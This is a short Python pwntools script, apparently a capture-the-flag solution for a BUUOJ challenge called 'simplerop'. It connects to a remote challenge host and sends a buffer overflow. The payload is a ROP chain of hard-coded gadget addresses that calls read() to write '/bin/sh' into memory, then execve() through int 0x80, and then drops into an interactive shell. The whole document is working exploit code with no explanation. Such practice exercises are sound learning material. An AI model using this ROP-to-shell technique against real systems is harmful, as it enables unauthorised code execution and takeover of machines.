from pwn import *
context(os='linux', arch='i386', log_level='debug')
p = remote('node4.buuoj.cn', 26325)
elf = ELF('./simplerop')

syscall = 0x0806eeef # nop ; int 0x80
sh = 0x080ea000
pop_eax = 0x080bae06 # pop eax ; ret
pop_ecx_ebx = 0x0806e851 # pop ecx ; pop ebx ; ret
pop_edx = 0x0806e82a # pop edx ; ret

# read(0, bss, 0x10)
# execve('/bin/sh', 0, 0)
pay = 'a'*0x20 + p32(pop_eax) + p32(3)
pay += p32(pop_ecx_ebx) + p32(sh) + p32(0)
pay += p32(pop_edx) + p32(16)
pay += p32(syscall)
pay += p32(pop_eax) + p32(11)
pay += p32(pop_ecx_ebx) + p32(0) + p32(sh)
pay += p32(pop_edx) + p32(0)
pay += p32(syscall)

p.recvuntil(':')
p.sendline(pay)
p.sendline('/bin/sh\x00')
# raw_input()
p.interactive()